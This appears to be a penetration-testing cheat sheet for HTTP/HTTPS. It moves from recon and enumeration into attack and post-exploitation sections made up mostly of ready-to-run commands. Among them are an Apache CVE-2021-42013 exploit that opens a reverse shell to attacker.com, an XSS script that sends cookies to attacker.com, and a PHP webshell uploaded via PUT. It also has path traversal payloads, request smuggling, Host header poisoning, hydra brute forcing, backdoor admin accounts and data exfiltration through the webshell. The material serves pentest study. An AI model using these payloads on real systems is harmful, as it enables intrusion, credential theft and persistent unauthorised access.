# http

**`Default Ports: 80 (HTTP), 443 (HTTPS), 8080, 8443`**

**HTTP (Hypertext Transfer Protocol)** and **HTTPS (HTTP Secure)** are the foundation protocols of the World Wide Web. They enable communication between web clients and servers. HTTP operates on port 80 by default, while HTTPS uses SSL/TLS encryption and operates on port 443. Alternative ports like 8080, 8443, and others are commonly used for development, proxies, or secondary web services.

### Connect <a href="#connect" id="connect"></a>

#### Using Web Browser <a href="#using-web-browser" id="using-web-browser"></a>

```
# HTTP connection
http://target.com
http://192.168.1.100

# HTTPS connection
https://target.com
https://192.168.1.100

# Non-standard ports
http://target.com:8080
https://target.com:8443
```

#### Using cURL <a href="#using-curl" id="using-curl"></a>

cURL is a versatile command-line tool for making HTTP requests and testing web servers.

**Basic HTTP Requests**

```
# Send basic GET request
curl http://target.com

# Follow HTTP redirects
curl -L http://target.com
```

**Advanced HTTP Options**

```
# Enable verbose output for HTTPS
curl -v https://target.com

# Send custom HTTP headers
curl -H "User-Agent: Custom" http://target.com

# Send POST request with data
curl -X POST -d "param=value" http://target.com/api

# Ignore SSL certificate errors
curl -k https://target.com
```

#### Using Wget <a href="#using-wget" id="using-wget"></a>

wget is a powerful tool for downloading files and creating local copies of websites.

```
# Download single file
wget http://target.com/file.txt

# Mirror entire website
wget --mirror --convert-links --page-requisites http://target.com

# Resume interrupted download
wget -c http://target.com/largefile.zip
```

### Recon <a href="#recon" id="recon"></a>

#### Service Detection with Nmap <a href="#service-detection-with-nmap" id="service-detection-with-nmap"></a>

Use `Nmap` to detect web servers and identify their versions and configurations.

**Basic Port and Version Detection**

```
# Scan common web server ports
nmap -p 80,443,8080,8443 target.com

# Detect web server version
nmap -p 80,443 -sV target.com
```

**Advanced Scanning and Analysis**

```
# Run aggressive scan with scripts
nmap -p 80,443 -A target.com

# Enumerate allowed HTTP methods
nmap -p 80 --script http-methods target.com

# Analyze SSL/TLS configuration
nmap -p 443 --script ssl-enum-ciphers target.com
```

#### Banner Grabbing <a href="#banner-grabbing" id="banner-grabbing"></a>

Banner grabbing helps identify the web server software and version, which can reveal potential vulnerabilities.

**Using Netcat and Telnet**

```
# Using netcat
nc target.com 80
GET / HTTP/1.1
Host: target.com

# Using telnet
telnet target.com 80
GET / HTTP/1.1
Host: target.com
```

**Using cURL and Wget**

```
# Using curl for headers only
curl -I http://target.com

# Using wget for headers
wget --server-response --spider http://target.com
```

#### SSL/TLS Certificate Analysis <a href="#ssltls-certificate-analysis" id="ssltls-certificate-analysis"></a>

Analyzing SSL/TLS certificates reveals encryption strength, expiration dates, and potential misconfigurations.

**Certificate Inspection**

```
# View full certificate chain
openssl s_client -connect target.com:443 -showcerts

# Test supported TLS versions
openssl s_client -connect target.com:443 -tls1_2

# Check certificate validity period
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -dates
```

**Cipher Suite Analysis**

```
# Enumerate cipher suites
nmap --script ssl-enum-ciphers -p 443 target.com
```

### Enumeration <a href="#enumeration" id="enumeration"></a>

#### Web Server Identification <a href="#web-server-identification" id="web-server-identification"></a>

Identifying the web server software and version helps determine applicable exploits.

**Server Header Analysis**

```
# Identify server from HTTP headers
nmap -p 80,443 --script http-server-header target.com
```

**Technology Detection**

```
# Detect web technologies and CMS
whatweb http://target.com

# Detect web application firewall
wafw00f http://target.com

# Fingerprint with signature database
httprint -h target.com -s signatures.txt
```

#### Directory and File Enumeration <a href="#directory-and-file-enumeration" id="directory-and-file-enumeration"></a>

Discovering hidden directories and files can reveal admin panels, backup files, and sensitive information.

**Using Gobuster and dirb**

```
# Brute force directories with Gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Scan with dirb
dirb http://target.com /usr/share/wordlists/dirb/common.txt
```

**Using dirsearch and ffuf**

```
# Search with dirsearch
dirsearch -u http://target.com -e php,html,js

# Fuzz with ffuf
ffuf -u http://target.com/FUZZ -w wordlist.txt

# Recursive scan with feroxbuster
feroxbuster -u http://target.com -w wordlist.txt
```

#### Virtual Host Discovery <a href="#virtual-host-discovery" id="virtual-host-discovery"></a>

Discover virtual hosts and subdomains on the target server.

**Automated Virtual Host Discovery**

```
# Using gobuster vhost mode
gobuster vhost -u http://target.com -w subdomains.txt

# Using ffuf
ffuf -u http://target.com -H "Host: FUZZ.target.com" -w subdomains.txt
```

**Manual Virtual Host Testing**

```
# Manual testing with curl
curl -H "Host: admin.target.com" http://192.168.1.100
```

#### HTTP Methods Enumeration <a href="#http-methods-enumeration" id="http-methods-enumeration"></a>

Enumerate supported HTTP methods to identify potential attack vectors.

**Discover Supported Methods**

```
# Using Nmap
nmap -p 80 --script http-methods target.com

# Using curl OPTIONS
curl -X OPTIONS http://target.com -v
```

**Test Dangerous Methods**

```
# Testing dangerous methods
curl -X PUT -d "test" http://target.com/test.txt
curl -X DELETE http://target.com/test.txt
curl -X TRACE http://target.com
```

#### robots.txt and sitemap.xml <a href="#robotstxt-and-sitemapxml" id="robotstxt-and-sitemapxml"></a>

Check common files that may reveal sensitive information or hidden paths.

**Check Standard Files**

```
# Check robots.txt
curl http://target.com/robots.txt

# Check sitemap
curl http://target.com/sitemap.xml
```

**Check Configuration Files**

```
# Check common files
curl http://target.com/.htaccess
curl http://target.com/web.config
curl http://target.com/.git/config
```

#### Technology Stack Detection <a href="#technology-stack-detection" id="technology-stack-detection"></a>

Identify the technology stack and frameworks used by the web application.

**Automated Technology Detection**

```
# Using Wappalyzer (browser extension)
# Or command-line version
wappalyzer http://target.com

# Using builtwith
builtwith target.com

# Using whatweb
whatweb -v http://target.com
```

**Manual Header Analysis**

```
# Check HTTP headers for clues
curl -I http://target.com | grep -i "x-powered-by\|server"
```

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

#### Common Vulnerabilities <a href="#common-vulnerabilities" id="common-vulnerabilities"></a>

**HTTP Verb Tampering**

```
# If GET is blocked, try POST
curl -X POST http://target.com/admin

# If POST is blocked, try GET
curl http://target.com/admin?action=delete

# Try PUT for file upload
curl -X PUT -d @shell.php http://target.com/uploads/shell.php

# Try PATCH for modification
curl -X PATCH -d '{"role":"admin"}' http://target.com/api/user/1
```

**Path Traversal**

```
# Basic traversal
http://target.com/page?file=../../../../etc/passwd

# URL encoded
http://target.com/page?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd

# Double encoded
http://target.com/page?file=..%252F..%252F..%252Fetc%252Fpasswd

# Unicode bypass
http://target.com/page?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
```

**HTTP Request Smuggling**

```
POST / HTTP/1.1
Host: target.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
```

**Host Header Injection**

```
# Password reset poisoning
curl -H "Host: evil.com" http://target.com/password-reset?email=victim@target.com

# Cache poisoning
curl -H "Host: evil.com" http://target.com/

# SSRF via Host header
curl -H "Host: 169.254.169.254" http://target.com/
```

#### Web Server Specific Exploits <a href="#web-server-specific-exploits" id="web-server-specific-exploits"></a>

Different web servers have unique vulnerabilities that can be exploited.

**Apache HTTP Server**

```
# Apache version < 2.4.49 - Path Traversal (CVE-2021-41773)
curl http://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd

# Apache 2.4.49 - RCE (CVE-2021-42013)
curl -X POST -d 'echo; /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"' \
  'http://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'

# .htaccess bypass
curl http://target.com/shell.php.txt -H "Content-Type: application/x-httpd-php"

# Range header DoS (CVE-2011-3192)
curl -H "Range: bytes=0-1,2-3,4-5,6-7,8-9" http://target.com/largefile
```

**Nginx**

```
# Alias traversal misconfiguration
curl http://target.com/static../etc/passwd

# Off-by-slash vulnerability
curl http://target.com/files../etc/passwd

# Merge slashes bypass
curl http://target.com//admin
```

**Microsoft IIS**

```
# Short filename disclosure (tilde vulnerability)
curl http://target.com/~1/
curl http://target.com/admin~1.asp

# Unicode bypass
curl http://target.com/admin%c0%afshell.aspx

# Double decode bypass
curl http://target.com/admin%252e%252e/etc/passwd
```

#### SSL/TLS Attacks <a href="#ssltls-attacks" id="ssltls-attacks"></a>

**Heartbleed (CVE-2014-0160)**

```
# Using Nmap NSE script
nmap -p 443 --script ssl-heartbleed target.com

# Using Metasploit
msfconsole
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS target.com
run
```

**POODLE Attack**

```
# Check SSLv3 support
nmap --script ssl-poodle -p 443 target.com

# Manual test
openssl s_client -connect target.com:443 -ssl3
```

**BEAST, CRIME, BREACH**

```
# Check for TLS compression (CRIME)
nmap --script ssl-enum-ciphers -p 443 target.com

# Test with SSLyze
sslyze --regular target.com:443
```

#### Authentication Attacks <a href="#authentication-attacks" id="authentication-attacks"></a>

Authentication attacks target web application login mechanisms to gain unauthorized access.

**Brute Force Attacks**

```
# Brute force HTTP Basic Auth
hydra -l admin -P passwords.txt target.com http-get /admin

# Brute force login forms
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:F=incorrect"

# Brute force API endpoints
hydra -l admin -P passwords.txt http-get://target.com/api
```

**Session Attacks**

```
# Cookie theft via XSS
<script>
fetch('https://attacker.com/steal?cookie='+document.cookie);
</script>

# Session fixation
http://target.com/login?PHPSESSID=attacker_session

# Session prediction
# Analyze session IDs for patterns
seq 1 100 | while read i; do curl -I http://target.com/login; done
```

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

#### Webshell Upload <a href="#webshell-upload" id="webshell-upload"></a>

Upload and execute webshells for persistent access.

**Create and Upload Webshell**

```
# PHP webshell
<?php system($_GET['cmd']); ?>

# Upload via PUT method (if allowed)
curl -X PUT -d '<?php system($_GET["cmd"]); ?>' \
  http://target.com/uploads/shell.php
```

**Execute Commands**

```
# Execute commands
curl http://target.com/uploads/shell.php?cmd=whoami
```

#### Pivoting <a href="#pivoting" id="pivoting"></a>

Use compromised web servers for network pivoting and lateral movement.

```
# Setup SOCKS proxy through compromised web server
# If SSH access obtained
ssh -D 9050 user@target.com

# Use proxychains
proxychains nmap -sT 192.168.1.0/24

# Port forwarding
ssh -L 3306:localhost:3306 user@target.com
```

#### Data Exfiltration <a href="#data-exfiltration" id="data-exfiltration"></a>

Extract sensitive data from compromised web servers.

**Download Files and Backups**

```
# Download database dumps
curl http://target.com/backup/database.sql -o database.sql

# Download source code
wget --mirror --convert-links http://target.com
```

**Extract via Webshell**

```
# Extract via compromised webshell
curl http://target.com/shell.php?cmd=tar+czf+/tmp/backup.tar.gz+/var/www/html
curl http://target.com/tmp/backup.tar.gz -o backup.tar.gz
```

#### Persistence <a href="#persistence" id="persistence"></a>

Establish persistent access to compromised web servers.

**Create Backdoor Accounts**

```
# Create backdoor account (if admin access)
curl -X POST http://target.com/admin/users/create \
  -d "username=backdoor&password=secret&role=admin" \
  -H "Cookie: admin_session=xyz"
```

**Modify Server Configuration**

```
# Modify .htaccess for backdoor
curl -X PUT -d 'AddType application/x-httpd-php .jpg' \
  http://target.com/.htaccess

# Then upload PHP code as .jpg
```

#### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

Escalate privileges on compromised web servers.

```
# Exploit SUID binaries (if shell access obtained)
find / -perm -4000 2>/dev/null

# Check sudo permissions
sudo -l

# Kernel exploits
uname -a
searchsploit linux kernel <version>
```

### Common HTTP Headers <a href="#common-http-headers" id="common-http-headers"></a>

| Header                        | Description                     | Security Impact                    |
| ----------------------------- | ------------------------------- | ---------------------------------- |
| `Server`                      | Web server software and version | Information disclosure             |
| `X-Powered-By`                | Technology stack information    | Information disclosure             |
| `X-AspNet-Version`            | ASP.NET version                 | Information disclosure             |
| `X-Frame-Options`             | Clickjacking protection         | If missing: Clickjacking possible  |
| `Content-Security-Policy`     | XSS protection                  | If missing: XSS easier to exploit  |
| `Strict-Transport-Security`   | Force HTTPS                     | If missing: MITM attacks possible  |
| `X-Content-Type-Options`      | MIME sniffing protection        | If missing: MIME confusion attacks |
| `Access-Control-Allow-Origin` | CORS policy                     | If misconfigured: Data theft       |

### Common HTTP Status Codes <a href="#common-http-status-codes" id="common-http-status-codes"></a>

| Code                        | Meaning                 | Pentesting Relevance             |
| --------------------------- | ----------------------- | -------------------------------- |
| `200 OK`                    | Success                 | Normal response                  |
| `301 Moved Permanently`     | Redirect                | Check for open redirects         |
| `302 Found`                 | Temporary redirect      | Check for open redirects         |
| `400 Bad Request`           | Malformed request       | Input validation testing         |
| `401 Unauthorized`          | Authentication required | Brute force target               |
| `403 Forbidden`             | Access denied           | Bypass techniques needed         |
| `404 Not Found`             | Resource not found      | Enumeration results              |
| `405 Method Not Allowed`    | HTTP method blocked     | Try verb tampering               |
| `500 Internal Server Error` | Server error            | Information disclosure in errors |
| `503 Service Unavailable`   | Server overloaded       | Potential DoS                    |

### Useful Tools <a href="#useful-tools" id="useful-tools"></a>

| Tool       | Description                 | Primary Use Case                             |
| ---------- | --------------------------- | -------------------------------------------- |
| Burp Suite | Web proxy and scanner       | Manual and automated testing                 |
| OWASP ZAP  | Web security scanner        | Automated vulnerability scanning             |
| Nikto      | Web server scanner          | Vulnerability and misconfiguration detection |
| Gobuster   | Directory/file brute-forcer | Content discovery                            |
| ffuf       | Fast web fuzzer             | Fuzzing and enumeration                      |
| SQLmap     | SQL injection tool          | Database exploitation                        |
| wfuzz      | Web fuzzer                  | Parameter fuzzing                            |
| curl       | HTTP client                 | Manual testing                               |
| wget       | Web downloader              | Content retrieval                            |
| Nmap       | Network scanner             | Service detection and enumeration            |

<br>
